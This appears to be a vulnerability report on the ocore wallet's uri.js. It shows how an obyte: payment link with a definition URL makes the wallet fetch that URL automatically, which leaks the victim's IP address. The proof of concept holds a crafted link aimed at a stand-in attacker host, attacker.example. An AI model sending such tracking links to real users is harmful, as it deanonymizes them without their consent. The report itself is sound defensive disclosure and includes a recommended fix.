## Title
Wallet automatically fetches attacker-controlled external URLs when processing `obyte:` payment-request links, leaking the victim's IP address - (File: uri.js)

### Summary
`ocore`'s `uri.js` module parses `obyte:`/`byteball:` deep-link URIs that can be crafted by any counterparty (sent as a chat "text" message, embedded in a QR code, or placed on a web page as a "Pay with Obyte" link) and handed to `parseUri()`. When the URI encodes a `data` request with `app=definition` and a `definition` value that starts with `https://`, the wallet automatically performs an unauthenticated outbound HTTP GET to that URL via `fetchUrl()`, with no confirmation, warning, or opt-out for the user.

### Finding Description
In `uri.js`, `parseUri()` handles the `data` app type and specifically the `definition` sub-case: [1](#0-0) 

If `assocParams.definition` begins with `https://`, `fetchUrl()` is invoked immediately, without any confirmation step, to retrieve content from that fully attacker-supplied URL: [2](#0-1) 

The URL is attacker-controlled end-to-end: the whole `data?app=definition&definition=https://attacker.example/x` string comes from the link itself, which can be shared over any channel the wallet trusts to some degree (paired-device chat "text" message handled in `wallet.js`, a QR code, or a payment link). Because the fetch happens automatically as soon as the URI is parsed/processed by the wallet, an attacker who controls `attacker.example` learns the victim's real IP address (and User-Agent, request timing, etc.) the moment the victim's wallet interacts with the crafted link — without ever needing the victim to explicitly click "view external content" or complete a transaction. This mirrors the Apache Answer CVE-2025-29868 class of bug: a private property of the user (their originating IP address) is exposed through automatic retrieval of externally referenced content that the application does not gate behind any privacy setting.

### Impact Explanation
Any counterparty capable of getting a link in front of a victim's wallet (a paired device sending a chat message, a merchant "pay" button, a QR code) can deanonymize the victim's IP address without the victim spending any funds or confirming any dialog beyond opening/processing the link. This is a privacy leak (network-location deanonymization) that is especially damaging for `ocore`-based wallets, which explicitly document IP-hiding features (`socksHost`/`bWantNewPeers`/stealth mode) as security-relevant configuration — this URI-fetch path bypasses those protections entirely since it's a direct application-layer HTTPS request outside of the SOCKS-proxied hub/peer connections.

### Likelihood Explanation
Likelihood is high for any wallet user who interacts with untrusted links, QR codes, or payment requests from third parties, which is a normal part of using the wallet (accepting payment requests, textcoins, etc.). No special privileges are required by the attacker beyond convincing/causing the wallet to process the crafted URI.

### Recommendation
Do not auto-fetch `https://` `definition` URLs (or any other externally referenced resource embedded in a URI) without explicit, informed user consent, and route any such fetch through the user's already-configured SOCKS/Tor proxy (`conf.socksHost`/`conf.socksPort`) rather than a direct `https.get()`. Alternatively, require the definition content to be provided inline/self-contained, or display a warning to the user disclosing that opening this link will reveal their IP address to the third-party host before performing the request.

### Proof of Concept
1. Attacker crafts a link: `obyte:data?app=definition&definition=https%3A%2F%2Fattacker.example%2Ftrack.json`.
2. Attacker sends this link to the victim (e.g., as a chat "text" message via a paired device, per the `text` handling in `wallet.js`, or as a QR code / payment page).
3. Victim's wallet calls `parseUri()` on the link; since `app === 'definition'` and the value starts with `https://`, `fetchUrl()` immediately issues `https.get('https://attacker.example/track.json', ...)` — see `uri.js` lines 124-136 and 251-291.
4. Attacker's server logs the victim wallet's IP address, correlating it with the specific link/victim identity, with no confirmation ever shown to the victim. [1](#0-0) [2](#0-1)

```javascript
function fetchUrl(url, cb) {
	var https = require('https');
	var bDone = false;
	function returnError(err) {
		console.log(err);
		if (bDone)
			return;
		bDone = true;
		cb(err);
	}
	try {
		https.get(url, function (resp) {
			if (resp.statusCode !== 200)
				return returnError("non-200 response while trying to fetch " + url);
			var data = '';

			// A chunk of data has been recieved.
			resp.on('data', function(chunk) {
				data += chunk;
			});

			// aborted before the whole response has been received
			resp.on('aborted', function () {
				returnError("connection aborted while trying to fetch " + url);
			});

			// The whole response has been received
			resp.on('end', function () {
				if (bDone)
					return;
				bDone = true;
				cb(null, data);
			});
		}).on("error", function(err) {
			returnError("non-200 response while trying to fetch " + url + ": " + err.message);
		});
	}
	catch(err) {
		returnError(err.message);
	}
}
```
